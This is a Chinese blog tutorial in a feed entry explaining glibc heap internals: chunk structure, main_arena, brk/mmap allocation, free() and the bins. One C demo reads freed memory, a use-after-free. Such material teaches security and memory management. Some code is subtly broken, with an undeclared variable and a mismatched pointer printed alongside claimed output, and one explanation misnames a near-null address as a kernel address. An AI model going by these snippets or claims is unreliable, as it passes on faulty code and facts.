      <category term="堆相关题目" scheme="https://muzibing.github.io/tags/%E5%A0%86%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>由浅入深的剖析堆</title>
    <link href="https://muzibing.github.io/2020/07/13/2020.07.13%EF%BC%88136%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/13/2020.07.13（136）/</id>
    <published>2020-07-12T16:00:00.000Z</published>
    <updated>2020-07-14T15:00:52.603Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>     只要学过C语言的同学想必都申请过堆内存吧，那么大家是否真正了解申请堆和释放堆后面的机制吗？今天我就带领大家一步一步的来了解，先在这里留一个问题：<code>上述代码是否有漏洞？</code>以后会慢慢的揭开这个答案，本文均是在64位下进行的实验。</p><h3 id="font-color-navy0x00-什么是堆font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-什么是堆font"></a> <font color="navy"><code>0x00 什么是堆？</code></font></h3><blockquote><p>在计算机科学中, 动态内存分配（Dynamic memory allocation）又称为堆内存分配，是指计算机程序在运行期中分配使用内存。它可以当成是一种分配有限内存资源所有权的方法。动态分配的内存在被程序员明确释放或被垃圾回收之前一直有效。与静态内存分配的区别在于没有一个固定的生存期。这样被分配的对象称之为有一个“动态生存期”。对堆操作的<strong>是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核</strong>。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能</p></blockquote><p>      简而言之，堆就是程序员动态分配的一个内存空间，它在进程内存中的分布如下：</p><p><img src="/images/136-1.png" alt></p><center><font size="2">图1</font></center><p>      从上图可以看出堆是由<strong>低地址向高地址生长的</strong>，这一点必须要清楚。虽然程序可以请求一块连续内存，并自由地使用，但是还应清楚：<strong>堆在内存空间中不一定连续</strong>。</p><p>      下面我们运行一下上述的代码，在main函数打个断点，当运行完<code>call malloc</code>后，该函数会返回给寄存器<code>eax</code>一个值，这个值就是动态申请的返回的指针<code>ptr</code>。</p><p><img src="/images/136-4.png" alt></p><center><font size="2">图2</font></center><blockquote><p>从上图可以看出返回的地址为<code>0x5555555592a0</code>，对于chunk来说这只是user_content的开始，不是chunk的地址，这块后面会详细讲解。</p></blockquote><p><img src="/images/136-2.png" alt></p><center><font size="2">图3</font></center><blockquote><p>从上图中可以看出，在执行malloc之后在程序的虚拟内存空间中映射了一个heap区域（有关虚拟地址的映射我会在后期在单独写一篇），也就是说这个时候堆已经分配成功了，那么我们计算一下映射的堆的大小是多少：<code>0x000055555557a000- 0x0000555555559000=0x21000（132KB）</code>，下面我们进行验证，看一下堆中的情况，如下图：</p></blockquote><p><img src="/images/136-3.png" alt></p><center><font size="2">图4</font></center><blockquote><p>如上图所示，执行完malloc后会有三个堆块，在这里先不说这些堆块的意义，只是计算一下它们的合计大小：<code>0x290+0x40+0x20d63=0x21000</code>，验证成功。在这里留几个问题：</p><ol><li><font color="green">【图一】返回的chunk指针为0x5555555592a0，为什么在heap看到的起始地址却是0x555555559290？</font></li><li><font color="green">【图一】我们申请的堆大小为50，为什么分配的堆块确是0x40（64）？</font></li><li><font color="green">【图二】我们只申请了大小为50个字节的堆空间，为什么给我们分配了<code>132KB</code>大小的堆空间？</font></li><li><font color="green">【图三】我们只申请了一个堆块，为什么堆空间中有三个堆块？</font></li></ol></blockquote><p>      下面我们还不会讲malloc背后的原理，让我们带着这些问题走进堆的学习。</p><h3 id="font-color-navy0x01-chunk讲解font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-chunk讲解font"></a> <font color="navy"><code>0x01 Chunk讲解</code></font></h3><p>      首先来看chunk的结构，下面给出chunk的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>从官方给出的源码中可以看出，chunk有两种结构，分别是<code>malloced chunk</code>和<code>freed chunk</code>，下面根据源码中的数据结构给出两种chunk的结构示意图，在这里给出的是64位下的，对齐字节为16字节。</p></blockquote><p><img src="/images/136-5.png" alt></p><center><font size="2">图5</font></center><blockquote><p>注释：</p><ul><li><code>prev_size</code>：当标志位p=0时，表示前面的chunk处于free状态，这时这里表示的是前一个chunk的大小；当p=1时，表示前面的chunk处于malloc状态，这时这里的数据可以被前面的chunk复用，下面会有例子说明；</li><li><code>size</code>：当前整个chunk的大小</li><li><code>user content</code>：用户申请的大小</li><li><code>A/M/P</code>：标志位<ul><li>A：A=0 为主分区（main_arena）分配，A=1 为非主分区分配</li><li>M：M=0为使用heap区域，M=1表示使用mmap映射区域</li><li>P：P=0 表示pre_chunk空闲，mchunk_prev_size才有效，P=1表示pre_chunk在使用中，prev_size被pre_chunk复用</li></ul></li><li><code>fd</code>：前一个堆块的地址（不是返回给用户的地址哦），只有chunk处于free状态时才有用，否则只是表示用户数据</li><li><code>bk</code>：后一个堆块的地址，只有chunk处于free状态时才有用，否则只是表示用户数据</li><li><code>fd_nextsize</code>： <strong>Only used for large blocks: pointer to next larger size</strong></li><li><code>bk_nextsize</code>：<strong>Only used for large blocks: pointer to prev larger size</strong></li></ul></blockquote><p>      有了上述的知识储备，那么我们就可以来回答第一个问题：<code>返回的chunk指针为0x5555555592a0，为什么在heap看到的起始地址却是0x555555559290？</code>我们从图5中可以看到，我们<strong>申请的堆空间只是user_content部分</strong>，<strong>而chunk真正的起始地址应该是指向prev_size的部分</strong>，所以chunk的起始地址应该为<code>返回给用户的地址-0x10=chunk的起始地址</code>，那么我们也就解决了第1个问题：<code>0x5555555592a0-0x10 = 0x555555559290</code></p><h3 id="font-color-navy0x02-main_arenafont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-main_arenafont"></a> <font color="navy"><code>0x02 main_arena</code></font></h3><p>      这里就是要回答第二个、第三个和第四个问题。在上述例子中，我们申请了50bytes大小的堆，操作系统却给我们申请了132KB大小的堆空间，这是为什么呢？首先在这里先向大家引入一个概念：<code>main_arena</code>，如下图：</p><p><img src="/images/136-6.png" alt></p><center><font size="2">图6</font></center><blockquote><p><code>main_arena</code>是由主线程分配的堆空间，<code>main_arena</code>中含有多个chunk，也就是返回给我们申请的堆的地址。因为132KB远远大于50B，所以如果主线程后续再申请堆空间的话，就会先从这132KB的剩余部分进行申请，直到用完或不够用的时候，再通过增加program break location的方式来增加main arena的大小。同理，当main arena中有过多空闲内存的时候，也会通过减小program break location的方式来缩小main arena的大小。<sup>[1]</sup></p></blockquote><p>      通过上述的介绍，我想<strong>第三个问题已经被解决了</strong>，下面开始第二个问题：<code>我们申请的堆大小为50，为什么分配的堆块确是0x40（64）？</code>通过上图我们可以看出，我们申请的50B大小的chunk，只是user_content部分的大小，所以真正的chunk大小应该是<code>0x8(prev_size)+0x8(size)+50=66Bytes</code>，但是从第2张图片中我们看到系统却只给我们64KB，这是为什么呢？还记得上一节中讲的chunk的标志位吗？当p=1时，则表示pre_chunk在使用中，prev_size被pre_chunk复用，对！这里就是这个意思，也就是说我们申请的堆块有2字节被放在了next chunk的prev_size字段中，下面我们可以写个程序验证一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      在执行了mecpy函数后，我们看一下堆中的存储情况，因为我们输入的字符串长度为50，正好是我们申请的大小，所以这里没有堆溢出，那么现在预测一下chunk的user_content，应该都是&quot;a&quot;，next_chunk的prev_size部分应该是&quot;b&quot;，如下图：</p><p><img src="/images/136-7.png" alt></p><center><font size="2">图7</font></center><blockquote><p>有关第二个问题，可以这样回答：因为我们申请的是50B大小的chunk，但是实际chunk的大小应该是：<code>用户申请的大小+16+nextchunk可以被复用的部分-prevchunk被复用的部分</code></p></blockquote><p>      下面只有第四个问题没有解决了：<code>我们只申请了一个堆块，为什么堆空间中有三个堆块？</code>在这里需要在main_arena区域中引入两个新的概念：<code>top chunk</code>和（<code>另外一个还没搞明白</code>），如下图：</p><p><img src="/images/136-8.jpg" alt></p><center><font size="2">图8</font></center><blockquote><p>从上图中可以看到，除了用户申请的chunk外的空间，处于高地址部分的为top chunk，该chunk并<strong>不属于任何bin</strong>，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。<sup>[1]</sup></p></blockquote><h3 id="font-color-navy0x03-malloc机制font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-malloc机制font"></a> <font color="navy"><code>0x03 malloc机制</code></font></h3><p>      在linux平台malloc本质上都是通过系统调用<strong>brk</strong>或者<strong>mmap</strong>实现的，如下图：</p><p><img src="/images/136-9.png" alt></p><center><font size="2">图9</font></center><blockquote><p>从操作系统角度来看，进程分配内存有两种方式，分别由两个系统调用完成：brk和mmap（不考虑共享内存）。</p><p>1、brk是将数据段(.data)的最高地址指针_edata往高地址推；</p><p>2、mmap是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存。</p><pre><code> 这两种方式分配的都是虚拟内存，没有分配物理内存。在第一次访问已分配的虚拟地址空间的时候，发生缺页中断，操作系统负责分配物理内存，然后建立虚拟内存和物理内存之间的映射关系。</code></pre><p>在标准C库中，提供了malloc/free函数分配释放内存，这两个函数底层是由brk，mmap，munmap这些系统调用实现的。<sup>[3]</sup></p></blockquote><p><code>brk()函数</code></p><blockquote><p><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L252" target="_blank" rel="noopener">brk</a>通过增加program break的位置（brk）从内核申请（非零值初始化的）内存。一开始，堆段(heap segment)的起始位置（start_brk）和结束位置(brk)指向同一个位置：</p><ul><li>当ASLR（Address Space Layout Randomization）关闭时，<code>start_brk</code>和brk同时指向<code>data/bss</code>段的结束位置（end_data）。</li><li>当ASLR打开时，<code>start_brk</code>和brk同时指向<code>data/bss</code>段的结束位置（<code>end_data</code>）再加上一个随机的brk偏移。</li></ul><p>上面的进程虚拟内存布局图展示了，start_brk是堆段的开始位置，brk(program break)则是堆段的结束位置。</p><p>malloc小于<code>M_MMAP_THRESHOLD</code>（默认为128KB）的内存<sup>[５]</sup>，使用brk分配内存，将_edata往高地址推(只分配虚拟空间，不对应物理内存(因此没有初始化)，第一次读/写数据时，引起内核缺页中断，内核才分配对应的物理内存，然后虚拟地址空间建立映射关系)，如下图：<sup>[4]</sup></p></blockquote><p><img src="/images/136-10.jpg" alt></p><center><font size="2">图10</font></center><blockquote><ol><li><p>进程启动的时候，其（虚拟）内存空间的初始布局如图10-(1)所示。</p><p>其中，mmap内存映射文件是在堆和栈的中间（<a href="http://xn--libc-2-9v9ii49d.2.93.so" target="_blank" rel="noopener">例如libc-2.2.93.so</a>，其它数据文件等），为了简单起见，省略了内存映射文件。_edata指针（glibc里面定义）指向数据段的最高地址。</p></li><li><p>进程调用**A=malloc(30KB)**以后，内存空间如图10-(2)：</p><ul><li><p>malloc函数会调用brk系统调用，将_edata指针往高地址推30K，就完成虚拟内存分配。</p></li><li><p>你可能会问：只要把_edata+30K就完成内存分配了？</p></li><li><p>事实是这样的，_edata+30K只是完成虚拟地址的分配，<strong>A这块内存现在还是没有物理页与之对应的</strong>，等到进程第一次读写A这块内存的时候，<strong>发生缺页中断，内核才分配A这块内存对应的物理页</strong>。也就是说，如果用malloc分配了A这块内容，然后从来不访问它，那么，A对应的物理页是不会被分配的。</p></li></ul></li><li><p>进程调用B=malloc(40K)以后，内存空间如图10-(3)。</p></li></ol></blockquote><p><code>mmap()函数</code></p><blockquote><p>malloc使用<a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285" target="_blank" rel="noopener">mmap</a>创建一个私有匿名的映射段。这个映射段的主要目的是申请一块（零值初始化的）新内存，这块内存处于栈和堆之间，并且<strong>这块内存只能被调用的这个进程独占使用</strong>。<sup>[4]</sup>当主线程malloc的大小大于128KB时以及子线程在申请动态内存时，会用到mmap来申请。</p></blockquote><p><img src="/images/136-11.png" alt></p><center><font size="2">图11</font></center><blockquote><ol><li><p>进程调用C=malloc(200K)以后，内存空间如图11-(4)：</p><p>默认情况下，malloc函数分配内存，如果请<strong>求内存大于128K</strong>（可由M_MMAP_THRESHOLD选项调节），那就不是去推_edata指针了，而是<strong>利用mmap系统调用，从堆和栈的中间分配一块虚拟内存。</strong></p><p>这样子做主要是因为：<strong>brk分配的内存需要等到高地址内存释放以后才能释放</strong>（例如，在B释放之前，A是不可能释放的，这就是内存碎片产生的原因，什么时候紧缩看下面），而mmap分配的内存可以单独释放。<br>当然，还有其它的好处，也有坏处，再具体下去，有兴趣的同学可以去看glibc里面malloc的代码了。</p></li><li><p>进程调用D=malloc(100K)以后，内存空间如图11-(5)；</p></li><li><p>进程调用<code>free(C)</code>以后，C对应的虚拟内存和物理内存一起释放如图11-(6)。</p></li></ol></blockquote><p><code>总结</code>：</p><ol><li>我们申请动态内存空间，实质上是由brk或mmap函数来完成的</li><li>申请的动态内存空间实质上是Arena区域的一个chunk，并且我们申请的大小只不过是user_content并不是整个chunk的大小</li><li>chunk在使用时和空闲时分别有着对应的状态，两者有着差别</li><li>堆的生长空间是从低地址到高地址</li></ol><h3 id="font-color-navy0x04-free机制font"><a class="markdownIt-Anchor" href="#font-color-navy0x04-free机制font"></a> <font color="navy"><code>0x04 Free机制</code></font></h3><p>      还记得文章开头的程序代码吗？我问了一个问题：<font color="red"><code>程序代码中有什么问题吗？</code> </font>下面就来看看上述代码有没有问题。给我们申请的内存赋值50个字符串后，我们再调用free函数，这个时候看一下chunk中的情况，如下图：</p><p><img src="/images/136-12.png" alt></p><center><font size="2">图12</font></center><blockquote><p>从图中看到，在free之后，chunk的结构发生了变化，但是除了<code>fd</code>和<code>bk</code>部分的数据改变以外，其他的数据并没有发生改变，那么在free之后我们是否能将剩下的数据打印出来呢？下面写个程序验证一下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Before free chunk:"</span>);</span><br><span class="line"><span class="built_in">puts</span>(ptr);    </span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] After  free chunk:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(ptr+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Before free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br><span class="line">[*] After  free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br></pre></td></tr></table></figure><blockquote><p>可以看出虽然我们free了chunk，但是我们仍然可以通过指针来访问chunk上的数据，所以说在free之后，我们一定要将指针置0，如下程序：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Before free chunk:"</span>);</span><br><span class="line"><span class="built_in">puts</span>(ptr);    </span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] After  free chunk:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(ptr+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Before free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><blockquote><p>可以看出在打印free后的chunk情况时发生了段错误，因为puts中的参数为0x10c，是内核地址，所以不能访问。</p></blockquote><p><font size="5"><strong>敲黑板！敲黑板！敲黑板！</strong></font>这里再提出一个问题：<code>free后的chunk去哪了？我们再次申请同样大小的chunk，会返回什么指针？</code>这里先解决第二个问题：<code>在free chunk后，再次申请同样大小的chunk，这时返回用户的指针是什么呢？</code>下面还是用程序进行验证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr0,*ptr1;</span><br><span class="line">    ptr0 = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr0,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"   </span></span><br><span class="line"><span class="built_in">free</span>(ptr0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] The address of chunk0:%p\n"</span>,ptr0);</span><br><span class="line">ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] ptr0 = NULL\n"</span>);</span><br><span class="line">    ptr0 = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] The address of chunk1:%p\n"</span>,ptr1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] The address of chunk0:0x5652b84e52a0</span><br><span class="line">[+] ptr0 = NULL</span><br><span class="line">[*] The address of chunk1:0x5652b84e52a0</span><br></pre></td></tr></table></figure><blockquote><p>从上面的结果可以看出我<strong>们第一次和第二次返回的指针相同，也就说明我们两次申请的动态内存空间是同一个空间</strong>，这是什么原因呢？下面就一步一步来解决这个问题：在堆释放后，为了充分利用chunk，系统并不会立即收回chunk，而是把chunk放到一个地方，如果程序中再次申请同样大小的chunk时，会直接将该chunk的地址返回，这里说的地方就是存放空闲chunk的链表结构<code>bins</code>，这里涉及的结构体就是malloc_state，如下是它的源码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>从上面的源代码可以看出，bins由两个数组构成分别是：FastbinsY[NFASTBINS]和bins[NBINS * 2 - 2]，通过查阅相关代码，可以知道FastbinsY[]中有一个容器：<code>fastbin</code>，bins[]由三个容器：<code>unsorted bins</code>、<code>small bins</code>和<code>large bins</code>。系统会根据空闲chunk的大小和处于的状态，会将空闲的chunk放在上述4个不同的bins中。注：在libc.2.26以上的动态链接库中又增加了一个<code>Tcache</code>机制，在这里就不展开了。</p></blockquote><h4 id="font-color-blue1fastbinsyfont"><a class="markdownIt-Anchor" href="#font-color-blue1fastbinsyfont"></a> <font color="blue"><code>1.FastbinsY[]</code></font></h4><p><code>fastbins</code></p><p>      